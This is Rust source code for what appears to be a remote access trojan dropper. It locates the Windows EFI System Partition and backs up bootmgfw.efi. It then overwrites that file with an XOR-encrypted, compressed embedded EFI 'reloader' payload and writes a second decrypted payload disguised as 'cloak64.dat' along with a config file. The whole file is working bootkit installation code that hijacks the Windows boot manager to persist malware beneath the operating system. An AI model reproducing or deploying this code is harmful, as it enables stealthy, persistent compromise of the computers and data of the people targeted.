use std::ffi::c_void;
use std::path::PathBuf;
use std::{fs, io, ptr};

use clap::Parser;
use rat_common::utils::DropGuard;
use rat_common::windows::RAT_EFI_FILE_NAME;
use rat_common::windows::config::Config;
use rat_common::windows::utils::is_equal_guid;
use rat_dropper::{EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, RELOADER_EFI_ENCRYPTED, cli};
use windows_sys::Win32::Foundation::{
    CloseHandle, ERROR_NO_MORE_FILES, GetLastError, INVALID_HANDLE_VALUE, MAX_PATH,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, FILE_SHARE_READ, FILE_SHARE_WRITE, FindFirstVolumeW, FindNextVolumeW,
    FindVolumeClose, OPEN_EXISTING, PARTITION_SYSTEM_GUID,
};
use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::System::Ioctl::{
    IOCTL_DISK_GET_PARTITION_INFO_EX, PARTITION_INFORMATION_EX, PARTITION_STYLE_GPT,
};
use windows_sys::w;

fn decrypt(cipher: &[u8]) -> Vec<u8> {
    cipher
        .iter()
        .zip(EFI_APPLICATION_KEY.iter().cycle())
        .map(|(&c, &k)| c ^ k)
        .collect()
}

fn write_decrypted_payload(cipher: &[u8], f: &mut fs::File) -> io::Result<()> {
    let decompressed = decrypt(cipher);
    let mut decompressor = zstd::Decoder::new(decompressed.as_slice())?;
    io::copy(&mut decompressor, f)?;

    Ok(())
}

fn is_esp_volume(volname: &mut [u16]) -> bool {
    let backslash = unsafe { *w!("\\") };
    let volname_ptr = volname.as_ptr();

    let guard0 = if let Some(last) = volname.last_mut()
        && *last == backslash
    {
        *last = 0;
        Some(DropGuard::new(last, |c| {
            *c = backslash;
        }))
    } else {
        None
    };

    let volume = unsafe {
        CreateFileW(
            volname_ptr,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null_mut(),
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
        )
    };
    if volume == INVALID_HANDLE_VALUE {
        let error = unsafe { GetLastError() };
        eprintln!("CreateFileW error: 0x{error:X} ({error})");
        return false;
    }

    let guard1 = DropGuard::new(volume, |v| unsafe {
        CloseHandle(v);
    });

    let mut partition_info = PARTITION_INFORMATION_EX::default();
    let mut returned = 0;
    if unsafe {
        DeviceIoControl(
            volume,
            IOCTL_DISK_GET_PARTITION_INFO_EX,
            ptr::null_mut(),
            0,
            &mut partition_info as *mut PARTITION_INFORMATION_EX as *mut c_void,
            size_of_val(&partition_info) as u32,
            &mut returned,
            ptr::null_mut(),
        ) == 0
    } {
        let error = unsafe { GetLastError() };
        eprintln!("DeviceIoControl error: 0x{error:X} ({error})");
        return false;
    }

    if partition_info.PartitionStyle != PARTITION_STYLE_GPT {
        return false;
    }

    let gpt = &unsafe { partition_info.Anonymous.Gpt };
    if !is_equal_guid(&gpt.PartitionType, &PARTITION_SYSTEM_GUID) {
        return false;
    }

    drop(guard1);
    drop(guard0);
    true
}

fn main() {
    let arguments = cli::Arguments::parse();

    let mut volname = [0; MAX_PATH as usize];

    let volume = unsafe { FindFirstVolumeW(volname.as_mut_ptr(), volname.len() as u32) };
    if volume == INVALID_HANDLE_VALUE {
        let error = unsafe { GetLastError() };
        eprintln!("FindFirstVolumeW error: 0x{error:X} ({error})");
        return;
    }

    let guard = DropGuard::new(volume, |v| unsafe {
        FindVolumeClose(v);
    });

    loop {
        // volname[len] = L'\0'
        // volname[len - 1] = L'\\' (possibly)
        let len = volname
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(volname.len());
        if is_esp_volume(&mut volname[..len]) {
            let name = String::from_utf16_lossy(&volname[..len]);
            let volume = PathBuf::from(name);
            println!("Found ESP volume {volume:?}");

            let bootdir = volume.join("EFI").join("Microsoft").join("Boot");
            let bootmgfw_old = bootdir.join("bootmgfw_old.efi");
            let bootmgfw = bootdir.join("bootmgfw.efi");

            if !bootmgfw_old.exists()
                && let Err(e) = fs::copy(&bootmgfw, &bootmgfw_old)
            {
                eprintln!("Failed to backup to {bootmgfw_old:?}: {e}");
                return;
            }

            match fs::File::create(&bootmgfw) {
                Ok(mut f) => {
                    if let Err(e) = write_decrypted_payload(RELOADER_EFI_ENCRYPTED, &mut f) {
                        eprintln!("Failed to write EFI application to {bootmgfw:?}: {e}");
                        drop(f);

                        // Restore original bootmgfw.efi
                        let _ = fs::remove_file(&bootmgfw);
                        let _ = fs::copy(&bootmgfw_old, &bootmgfw);

                        return;
                    }
                }
                Err(e) => {
                    eprintln!("Failed to open {bootmgfw:?} for writing: {e}");
                    return;
                }
            }

            let rat_efi = bootdir.join(RAT_EFI_FILE_NAME);
            if let Err(e) = fs::copy(&bootmgfw, &rat_efi) {
                eprintln!("Failed to copy to {rat_efi:?}: {e}");
                return;
            }

            let cloak64 = bootdir.join("cloak64.dat");
            match fs::File::create(&cloak64) {
                Ok(mut f) => {
                    if let Err(e) = write_decrypted_payload(EFI_APPLICATION_ENCRYPTED, &mut f) {
                        eprintln!("Failed to write EFI application to {cloak64:?}: {e}");
                        drop(f);

                        let _ = fs::remove_file(&cloak64);

                        return;
                    }
                }
                Err(e) => {
                    eprintln!("Failed to open {cloak64:?} for writing: {e}");
                    return;
                }
            }

            let config = bootdir.join("config.json");
            match fs::File::create(&config) {
                Ok(mut f) => {
                    if let Err(e) = serde_json::to_writer_pretty(
                        &mut f,
                        &Config {
                            argument: arguments.argument,
                        },
                    ) {
                        eprintln!("Failed to write config to {config:?}: {e}");
                        drop(f);

                        let _ = fs::remove_file(&config);

                        return;
                    }
                }
                Err(e) => {
                    eprintln!("Failed to open {config:?} for writing: {e}");
                    return;
                }
            }

            return;
        }

        volname.fill(0);

        if unsafe { FindNextVolumeW(volume, volname.as_mut_ptr(), volname.len() as u32) } == 0 {
            let error = unsafe { GetLastError() };
            if error != ERROR_NO_MORE_FILES {
                eprintln!("FindNextVolumeW error: 0x{error:X} ({error})");
            }

            break;
        }
    }

    drop(guard);
}
